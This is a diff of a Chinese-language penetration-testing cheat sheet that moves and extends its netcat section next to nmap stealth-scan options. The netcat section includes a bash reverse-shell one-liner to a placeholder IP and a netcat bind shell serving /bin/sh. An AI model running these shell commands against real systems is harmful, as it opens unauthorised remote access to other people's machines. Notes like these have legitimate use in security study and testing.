@@ -31,6 +31,13 @@ tmux a    #重新连接最近会话
 tmux a -t #重新连接托管会话
 tmux new -s #创建新会话会话
 
+##netcat
+nc -l 8888 > test.txt  #接收文件 -l 监听 -v 详细
+nc [接收端IP] 8888 < test.txt  #发送文件
+nc -znv -w 1 [目标IP] 20-100  #端口扫描 -z 不进行交互 -n 跳过DNS查询 -v 详细 -w 1 超过1秒没响应跳过端口
+bash -i >& /dev/tcp/[你的IP]/8888 0>&1  #反弹shell
+nc -lvp 8888 -e /bin/sh  #正向shell
+
 ##nmap
 nmap -sS -Pn -n -T2 --open --max-retries 1 -v 192.168.1.1
 -sS (SYN Scan)半开放扫描
@@ -43,12 +50,6 @@ nmap -sS -Pn -n -T2 --open --max-retries 1 -v 192.168.1.1
 --max-retries 1 即使丢包也不反复尝试
 --source-port 53 源端口伪装
 --spoof-mac 源设备伪装
-
-##netcat
-nc -l 8888 > test.txt  #接收文件 -l 监听 -v 详细
-nc [接收端IP] 8888 < test.txt  #发送文件
-nc -znv -w 1 [目标IP] 20-100  #nc扫描 -z 不进行交互 -n 跳过DNS查询 -v 详细 -w 1 超过1秒没响应跳过端口
-bash -i >& /dev/tcp/[你的IP]/8888 0>&1  #反弹shell
 
 ##aircrack-ng
 iw dev
